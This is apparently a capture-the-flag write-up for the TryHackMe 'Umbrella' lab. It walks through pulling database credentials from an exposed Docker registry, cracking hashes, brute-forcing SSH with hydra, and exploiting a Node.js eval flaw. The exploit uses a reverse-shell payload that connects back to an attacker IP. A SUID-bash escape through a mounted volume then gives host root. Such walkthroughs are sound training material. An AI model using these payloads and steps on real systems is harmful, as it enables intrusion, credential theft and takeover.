---
title: 'TryHackMe: Umbrella'
author: jaxafed
categories: [TryHackMe]
tags: [web, node, docker, mysql, rce]
render_with_liquid: false
media_subpath: /images/tryhackme_umbrella/
image:
  path: room_image.webp
---

Umbrella had an exposed Docker registry that allowed us to find database credentials. Using these database credentials to connect to the database and dumping the hashes, we were able to crack them and use the cracked password to get a shell via SSH. Upon discovering the container running a web application had a volume mounted from the host, we examined the source code of this web application to discover a RCE vulnerability and used this to get a shell as root inside the container. To abuse the mentioned mounted volume, we created a suid binary inside that volume from the container and run this suid binary from the host to get a shell as root on the host.

![Tryhackme Room Link](room_card.webp){: width="600" height="150" .shadow }
_<https://tryhackme.com/room/umbrella>_

## Initial enumeration

### Nmap Scan

```console
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-19 21:30 GMT
Nmap scan report for 10.10.142.44
Host is up (0.083s latency).
Not shown: 65436 closed tcp ports (conn-refused), 95 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:14:2f:d6:f6:76:8c:58:9a:8e:84:6a:b1:fb:b9:9f (RSA)
|   256 8a:52:f1:d6:ea:6d:18:b2:6f:26:ca:89:87:c9:49:6d (ECDSA)
|_  256 4b:0d:62:2a:79:5c:a0:7b:c4:f4:6c:76:3c:22:7f:f9 (ED25519)
3306/tcp open  mysql   MySQL 5.7.40
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-12-22T10:04:49
|_Not valid after:  2032-12-19T10:04:49
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 4
|   Capabilities flags: 65535
|   Some Capabilities: ConnectWithDatabase, SwitchToSSLAfterHandshake, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsLoadDataLocal, SupportsTransactions, LongPassword, InteractiveClient, FoundRows, Speaks41ProtocolOld, Support41Auth, IgnoreSigpipes, Speaks41ProtocolNew, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x012hV\x15!/\x01~\x14O6Nf\x1D\x01X:'L
|_  Auth Plugin Name: mysql_native_password
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
8080/tcp open  http    Node.js (Express middleware)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
There are four ports open:
- 22/SSH
- 3306/MYSQL
- 5000/HTTP
- 8080/HTTP

### Port 5000

Port 5000 returns an empty HTTP response.

Fuzzing for directories, we find `/v2/`.
```console
$ gobuster dir -u http://10.10.142.44:5000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 50
...
/v2                   (Status: 301) [Size: 39] [--> /v2/]
...
```
From the response headers of a request to `http://10.10.142.44:5000/v2/`, we see it is a Docker registry.

```console
$ curl -v http://10.10.142.44:5000/v2/
*   Trying 10.10.142.44:5000...
* Connected to 10.10.142.44 (10.10.142.44) port 5000
> GET /v2/ HTTP/1.1
> Host: 10.10.142.44:5000
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Length: 2
< Content-Type: application/json; charset=utf-8
< Docker-Distribution-Api-Version: registry/2.0
< X-Content-Type-Options: nosniff
< Date: Fri, 19 Jan 2024 21:45:18 GMT
< 
* Connection #0 to host 10.10.142.44 left intact
{}
```

### Port 8080

Visiting port 8080, we see a login page.

![Port 8080 Login](port_8080_login.webp){: width="800" height="500" }

I was not able to bypass the login, and directory fuzzing did not find anything useful. So, I went back to the Docker registry.

## Foothold as claire-r

### Enumerating the Docker Registry

Getting a list of repositories.

```console
$ curl -s http://10.10.142.44:5000/v2/_catalog | jq
{
  "repositories": [
    "umbrella/timetracking"
  ]
}
```
- There is one repository named: `umbrella/timetracking`

Getting the tags for repository.
```console
$ curl -s http://10.10.142.44:5000/v2/umbrella/timetracking/tags/list | jq
{
  "name": "umbrella/timetracking",
  "tags": [
    "latest"
  ]
}
```

- There is only one tag: `latest`

### Finding DB Credentials

Checking the manifest for `umbrella/timetracking:latest`, we get the credentials for the database in environment variables.

```console
$ curl -s http://10.10.142.44:5000/v2/umbrella/timetracking/manifests/latest | jq
```
![Database Password](db_pass.webp){: width="800" height="300" }

### Dumping hashes from the database and cracking them

Connecting to the database.
```console
$ mysql -u root -p -h 10.10.142.44
```

Listing databases.

```console
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| timetracking       |
+--------------------+
5 rows in set (0.085 sec)
```
Dumping the hashes.

```console
MySQL [(none)]> use timetracking;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [timetracking]> show tables;
+------------------------+
| Tables_in_timetracking |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.082 sec)

MySQL [timetracking]> select * from users;
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | 2a****************************63 |   360 |
| chris-r  | 0d****************************b7 |   420 |
| jill-v   | d5****************************c8 |   564 |
| barry-b  | 4a****************************94 | 47893 |
+----------+----------------------------------+-------+
4 rows in set (0.084 sec)
```

Using [crackstation.net](https://crackstation.net/) to crack the hashes, we get some passwords.

![Cracked hashes](cracked_hashes.webp){: width="1000" height="450" }

### Shell as claire-r via SSH

Testing the usernames and passwords we have against SSH, we found a valid login.

```console
$ hydra -L usernames.txt -P passwords.txt ssh://10.10.142.44                
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-19 22:06:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking ssh://10.10.142.44:22/
[22][ssh] host: 10.10.142.44   login: claire-r   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-19 22:06:46
```

Using SSH, we get a shell as `claire-r` and are able to read the user flag.

```console
$ ssh claire-r@10.10.142.44
claire-r@10.10.142.44's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
...
claire-r@ctf:~$ wc -c user.txt 
38 user.txt
```

## Privilige Escalation to root

### Enumerating the file system

We find the `docker-compose.yml` used to spin up containers.

```console
claire-r@ctf:~/timeTracker-src$ cat docker-compose.yml 
version: '3.3'
services:
  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: 'timetracking'
      MYSQL_ROOT_PASSWORD: '[REDACTED]'
    ports:
      - '3306:3306'     
    volumes:
      - ./db:/docker-entrypoint-initdb.d
  app:
    image: umbrella/timetracking:latest
    restart: always
    ports:
      - '8080:8080'
    volumes:
      - ./logs:/logs
```

Examining the docker compose file, we notice `/home/claire-r/timeTracker-src/logs` is mounted inside the web application container at `/logs`.

If we manage to get a shell as root inside this Docker container, we can abuse this mount to escalate privileges.

### Examining the source code of the web application to discover a RCE vulnerability

> Source code of the web application is already available at `/home/claire-r/timeTracker-src/app.js`. But if that was not the case, we could use something like [DockerRegistryGrabber](https://github.com/Syzik/DockerRegistryGrabber) to dump the registry and get the source code that way.
{: .prompt-tip }

Looking at the source code, we see that upon a POST request to `/time` with the `time` parameter, this user-controlled input is passed to the eval function.

```javascript
...
app.post('/time', function(request, response) {
    
    if (request.session.loggedin && request.session.username) {

        let timeCalc = parseInt(eval(request.body.time)); 
        let time = isNaN(timeCalc) ? 0 : timeCalc;
        let username = request.session.username;

        connection.query("UPDATE users SET time = time + ? WHERE user = ?", [time, username], function(error, results, fields) {
            if (error) {
                log(error, "error")
            };

            log(`${username} added ${time} minutes.`, "info")
            response.redirect('/');
        });
    } else {
        response.redirect('/');;    
    }
    
});
...
```
{: file="/home/claire-r/timeTracker-src/app.js" }

This eval call with unsanitized user input is responsible for the RCE vulnerability.
```javascript
let timeCalc = parseInt(eval(request.body.time)); 
```

### Getting a shell inside the Docker container

Logging in to `http://10.10.142.44:8080/` with the credentials we got from the database.

> If we were not successful at cracking the hashes we got from the database, we would still be able to login to the web application by changing the password hashes or adding a new user, since we have direct access to mysql database.
{: .prompt-tip }

We get an input form that makes a POST request to `/time` and a table listing time spent by users.

![Port 8080 Dashboard](port_8080_dashboard.webp){: width="1000" height="400" }

Since we already know our input will be passed to the `eval` function using a node.js reverse shell payload as input.

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(443, "10.11.63.57", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

![Sending reverse shell payload](reverse_shell_payload.webp){: width="600" height="500" }

With this, we get a shell inside the docker container.

Using `script` to stabilize the shell.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.63.57] from (UNKNOWN) [10.10.142.44] 50034
/usr/bin/script -qc /bin/bash /dev/null
root@de0610f51845:/usr/src/app# ^Z
zsh: suspended  nc -lvnp 443
                                                                                                                               
$ stty raw -echo; fg     
[1]  + continued  nc -lvnp 443

root@de0610f51845:/usr/src/app# export TERM=xterm
root@de0610f51845:/usr/src/app# stty rows 26 cols 127
root@de0610f51845:/usr/src/app# 
```

### Creating a SUID binary inside /logs

Copying the `/bin/bash` inside `/home/claire-r/timeTracker-src/logs` from the host.
```console
claire-r@ctf:~/timeTracker-src/logs$ cp /bin/bash .
```

From the container, changing the owner for `bash` binary to `root` and setting the `suid` bit.

```console
root@de0610f51845:/logs# chown root:root bash
root@de0610f51845:/logs# chmod 4777 bash
```
Now we have a `bash` binary with `suid` bit set.

```console
claire-r@ctf:~/timeTracker-src/logs$ ls -la 
total 1168
drwxrw-rw- 2 claire-r claire-r    4096 Jan 19 23:36 .
drwxrwxr-x 6 claire-r claire-r    4096 Dec 22  2022 ..
-rwsrwxrwx 1 root     root     1183448 Jan 19 23:36 bash
-rw-r--r-- 1 root     root         130 Jan 19 23:30 tt.log
```

### Shell as root

Using the suid bash binary we created, we are able to get a shell as root and read the root flag.

```console
claire-r@ctf:~/timeTracker-src/logs$ ./bash -p
bash-5.0# id
uid=1001(claire-r) gid=1001(claire-r) euid=0(root) groups=1001(claire-r)
bash-5.0# wc -c /root/root.txt
38 /root/root.txt
```
